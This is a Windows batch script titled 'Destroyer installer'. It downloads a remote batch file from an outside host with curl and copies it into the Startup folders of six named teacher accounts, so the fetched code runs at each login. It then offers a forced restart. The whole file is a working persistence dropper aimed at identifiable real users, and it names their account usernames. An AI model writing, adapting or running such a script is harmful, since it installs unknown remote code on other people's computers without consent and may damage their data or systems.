@echo off
color 0a
title Destroyer installer by Tobir
cls
echo Running installer...
echo Selected users: dvichorcova.ucitel, bknazejova.ucitel, kjanku.ucitel, jfucikova.ucitel, jnozickova.ucitel, jdvorackova.ucitel
title Creating temporary folder on drive C:\
echo Opening drive C:\
cd C:\
echo Creating folder...
mkdir temporary
echo Folder created, opening...
cd temporary
echo Downloading file
title Downloading main file.
curl -s https://sources.tobir.xyz/main-all.bat > main.bat
echo File downloaded.
echo Installing for users.
echo Installing for user dvichorcova.ucitel
copy main.bat "C:\Users\dvichorcova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installing for user bknazejova.ucitel
copy main.bat "C:\Users\bknazejova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installing for user kjanku.ucitel
copy main.bat "C:\Users\kjanku.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installing for user jfucikova.ucitel
copy main.bat "C:\Users\jfucikova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installing for user jnozickova.ucitel
copy main.bat "C:\Users\jnozickova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installing for user jdvorackova.ucitel
copy main.bat "C:\Users\jdvorackova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.bat"
echo Installed, verifing.
dir "C:\Users\dvichorcova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\bknazejova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\kjanku.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\jfucikova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\jnozickova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\jdvorackova.ucitel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
ping localhost -n 20 > nul
echo If you want to restart computer, type "r"
set /p r1151=
if %r1151%==r goto :restart
exit

:restart
echo Restarting...
shutdown /r /t 1 /f